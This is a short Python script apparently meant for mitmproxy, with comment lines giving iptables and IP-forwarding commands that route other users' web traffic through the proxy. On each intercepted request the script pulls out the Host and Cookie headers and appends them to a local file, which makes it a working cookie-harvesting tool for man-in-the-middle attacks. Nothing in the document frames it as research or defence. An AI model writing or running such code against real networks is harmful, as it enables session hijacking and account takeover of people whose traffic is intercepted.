#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
# sudo sysctl -w net.ipv4.ip_forward=1

from libmproxy.protocol.http import decoded

def response(context, flow):
    with decoded(flow.response):  # automatically decode gzipped responses.
        headers = flow.request.headers
        host = headers.get('Host')
        cookies = headers.get('Cookie')
        print(cookies)
        if host ==None or cookies ==None:
            return True
        with open('savecookies','a') as f:
            f.write(','.join(host))
            f.write("\n")
            f.write(';'.join(cookies))
            f.write("\n\n")